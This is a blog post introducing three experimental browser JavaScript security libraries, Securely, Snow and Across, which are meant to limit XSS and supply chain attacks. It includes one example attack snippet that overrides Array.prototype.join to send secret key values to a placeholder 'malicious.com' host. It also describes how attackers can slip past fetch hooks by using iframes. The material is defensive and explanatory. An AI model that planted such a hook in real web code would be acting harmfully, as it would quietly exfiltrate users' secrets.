---
layout: page
title: My contribution attempt to the browser javascript supply chain attack problem
url: https://weizman.github.io/
date: 18/07/2021
description: Introducing Securely, Snow and Across to help fight browser javascript supply chain attacks
keywords: browser, javascript, supply chain attack, security, xss, securely, snow, across
---

## Introducing Securely 🔒, Snow ❄️ and Across ↔

> *tl;dr - Today I share my "side project" for the past year, three browser javascript security libraries that aim to perform as
platforms for creating web apps that are more resilient to and limiting of unwanted code execution such as XSS and javascript supply chain attacks:*

#### [Across ↔](https://github.com/weizman/across)

Across standard allows different scripts within the same web application to communicate with each other by passing messages between one another securely.

[🎬 Live Demo](https://weizman.github.io/across/demo/) | 
[📖 Technical explanation](https://github.com/weizman/across/wiki/Introducing-Across#across-technically-explained) | 
[⚙️ Installation and usage](https://github.com/weizman/across#install) | 
[👩🏽‍💻 Source Code](https://github.com/weizman/across) | 
[💪🏻 Motivation behind this project](https://github.com/weizman/across/wiki/Introducing-Across)

#### [Snow ❄️](https://github.com/weizman/snow)

Snow aspires to standardize how to recursively own newborn windows within a browser webpage, from the context of the webpage itself.

[🎬 Live Demo](https://weizman.github.io/snow/demo/) | 
[📖 Technical explanation](https://github.com/weizman/snow/wiki/Introducing-Snow#why-snow-solves-a-non-trivial-problem) | 
[⚙️ Installation and usage](https://github.com/weizman/snow#usage) | 
[👩🏽‍💻 Source Code](https://github.com/weizman/snow) | 
[💪🏻 Motivation behind this project](https://github.com/weizman/snow/wiki/Introducing-Snow)

#### [Securely 🔒](https://github.com/weizman/securely)

Securely allows you to call native APIs using their original behaviour even if they were tampered within the web app.

[🎬 Live Demo](https://weizman.github.io/securely/demo/) | 
[📖 Technical explanation](https://github.com/weizman/securely#securely-technically-explained-whats-the-s-suffix-for) | 
[⚙️ Installation and usage](https://github.com/weizman/securely#usage) | 
[👩🏽‍💻 Source Code](https://github.com/weizman/securely)

**`Across` is built on top of `Snow`. Both `Across` and `Snow` are built on top of `Securely`.**

**⚠️ These technologies are currently experimental!**

## The [Supply Chain Attacks](https://www.google.com/search?q=javascript+website+supply+chain+attack) Problem

In general, the ability to execute unwanted code within a website is still a major problem.
Doing so with XSS is less common these days, but with infection of the supply chain web apps which is a rising issue, it's still very much possible.

To prevent such attacks, there are many different areas to defend. 
In my attempt, I focus on the real time prevention in the browser. 
Or in other words, what can attackers do once they successfully run within the website in the browser, and what I can do to make it harder for them?

### [Securely 🔒](https://github.com/weizman/securely)

One thing attackers can do is to use the native option of javascript to override builtin functionalities and by that potentially have
the website legit code go through their malicious hooks and leak sensitive information:

```javascript
/* supply chain attack */

const desc = Object.getOwnPropertyDescriptor(Array.prototype, 'join');
const join = desc.value;
desc.value = function(separator) {
    const ret = join.call(this, separator);
    fetch('https://malicious.com/steal-key?key=' + ret);
    return ret;
}
Object.defineProperty(Array.prototype, 'join', desc);
```

```javascript
/* website legit code */

function constructKey() {
  const keyParts = getSecretKeyParts();
  // this goes through attacker's hook!
  const key = keyParts.join('-');
  return key;
}
```

To that problem there are different approachs that are currently being pushed on.

For example, the approach taken by [Consensys](https://github.com/consensys) [MetaMask](https://github.com/metamask)'s [LavaMoat](https://github.com/lavamoat)
which runs on [Endo](https://github.com/endojs)'s [SES](https://github.com/endojs/endo) technology is the lockdown method, which is generally 
to freeze the ability to apply such hooks in the first place to prevent such attacks exactly.

**A lax alternative to this approach is [Securely 🔒](https://github.com/weizman/securely).**

Securely permits the web app and all js code that runs within it to apply such hooks out of belief that
these hooks are a legitimate and unseparatable part of the service provided by many third party vendors, especially in websites.

Instead, **Securely allows you to declare what native functionalities you might need to use in your web app** that you want to avoid any potential hooks
and **grants you exculsive access to them when needed:**

```javascript
const secure = require('@weizman/securely');
const securely = secure(window, {
    objects: {
        'document': ['createElement'],
        'window': ['fetch'],
    },
    prototypes: {
        'Array': ['includes', 'push', 'join'],
    }
});
```

So to go back to the example above, if you need to use `Array.prototype.join` native API to safely construct your key, but still want to allow legitimate
js code in your website to hook it for whatever reason, you can use Securely to achieve that:

```javascript
/* website legit code using Securely */

function constructKey() {
  const keyParts = getSecretKeyParts();
  // this does NOT goes through attacker's hook!
  const key = securely(() => keyParts.joinS('-')); // 'S' stands for Securely!
  return key;
}
```

This infect allows you to avoid potential hooks or go through them when needed, depends on the usecase, which can be very affective 
against supply chain attacks when executing sensitive operations.

> *To dive into Securely and learn more about this, its source code, how to install and use, how and why it works and designed*
> *the way it is and to see a live demonstration of how it works refer to the resources [listed above](#securely-)*

### [Snow ❄️](https://github.com/weizman/snow)

Another thing attackers can do is the opposite of what Securely comes to defend against - let me explain.

There are already third party vendors that offer security services to websites against supply chain attacks by hooking sensitive
APIs in the website (just like attackers do) in order to track their usage and discover malicious activity.

So for example, if attackers might use `fetch` API to exfiltrate sensitive information from the website, these vendors hook
`fetch` API so that attackers go through them and by that can observe/block such malicious activity.

The problem with that approach is `iframes`

When creating a new `iframe`, a new `window` is attached to it, with all the usual APIs the top window exposes.
So if such a security vendor hooks `fetch` API to catch attackers, the attackers can easily avoid that hook by creating
a new iframe and pulling out of there a brand new `fetch` API.

**By granting you the very first right of execution on every new iframe that 
comes to life within the web app, [Snow ❄️](https://github.com/weizman/snow) comes to solve exactly that.**

So if security vendors used to hook fetch like this:

```javascript
const realFetch = window.fetch;
window.fetch = function(arg1, arg2, arg3) {
    console.log('fetch activity logged, might be an attacker', arg1, arg2, arg3);
    return realFetch.call(this, arg1, arg2, arg3);
};
```

With Snow you can now apply that code to every new iframe that comes to life within the app:

```javascript
const snow = require('@weizman/snow');
snow((win) => {
    const realFetch = win.fetch;
    win.fetch = function(arg1, arg2, arg3) {
        console.log('fetch activity logged, might be an attacker', arg1, arg2, arg3);
        return realFetch.call(this, arg1, arg2, arg3);
    };
});
```

Snow is a security driven project - it aspires to cover all techniques there are to creating new iframes, and it makes sure its
internal functionality is secure by calling sensitive operations via `Securely`.

Snow aspires to set a new standart hermatic solution to nested ownership of windows in a webpage. Therefore, snow is very useful
to a lot of other purposes, in and outside of the security field.

> *To dive into Snow and learn more about this, its source code, how to install and use, how and why it works and designed*
> *the way it is and to see a live demonstration of how it works refer to the resources [listed above](#snow-)*

### [Across ↔](https://github.com/weizman/across)

Across specifically is a new technology (also security related) that is a bit bigger than the supply chain attacks problem, but could not have been
created without leaning on Snow and Securely.

**In order to unlock the ability for two scripts within a webpage to communicate with each other securly based on their origin, [Across ↔](https://github.com/weizman/across) aspires to establish a way to do so**

In other words, with Across script `https://x.com/a.js` can share information with `https://y.com/b.js` and stay assured that this information:

* really did come from the sender script and not any other entity.
* was not tampered by any other entity.
* was not read by any other entity.

which is a state that cannot be achieved based on how modern browsers work.

To me, Across is a very exciting technology that unlocks possibilities that were non existing until now.

With Across third party scripts can safely exchange information with each other on the client side without needing a server.

Across can also be used to fight the supply chain attacks problem.
For example, Across can be used to set up a "proxy script" to sensitive APIs and grant access to those APIs only to specific scripts based on their origin.

This unlocks the ability to solve security problems, redefine business relations between different javascript vendors and more.

I dive into the possibilities Across unlocks in the [following section](https://github.com/weizman/across/wiki/Introducing-Across#unlocking-possibilities-with-across)

Across is also a security drived project that could not have been made without:
* Snow - to apply itself in all new windows in the webpage to remain secured;
* Securely - to eliminate the ability of an attacker to sabotage Across's core functionality by overriding APIs it uses.

> *To dive into Across and learn more about this, its source code, how to install and use, how and why it works and designed*
> *the way it is and to see a live demonstration of how it works refer to the resources [listed above](#across-)*

## My Take

As someone with vast experience in aspects of browser javascript security, including but not limited to supply chain defense, I wish
Securely, Snow and Across will be adopted and contributed to in order to get them ready for production usage.

I believe all three of them can be used to create more secure software that is less vulnerable to unwanted code that is executing within
a website in a browser, thanks to them handling exactly the security problems javascript allows as of today.

That being said, my approach is not the only one, I highly recommend learning about the counter 
approach that [LavaMoat](https://github.com/lavamoat/lavamoat) brings.

I hope that with time we learn how to integrate and adopt all solutions as they are important together for creating a more secure
development platform for javascript web apps.

It is important to note - Securely, Snow and Across are platforms for development, they are not standalone solutions.
In order for them to be effective one must use them as tools to fruther secure their web app.

## Feedback

I'd love to hear your feedback! Whether its help with the project, feedback on my approach and perception of the 
problem and the solution or anything else - it is highly appreciated.

Because eventually, these tools cannot take off without adoption.

I encourage you to read further about these technologies. Each one of them has its own README, WIKI and DEMO files that
aspire to explain and demonstrate these projects further as much as possible, in terms of motivation, technical explanation, demonstration and usage.

Hope this turns out helpful!
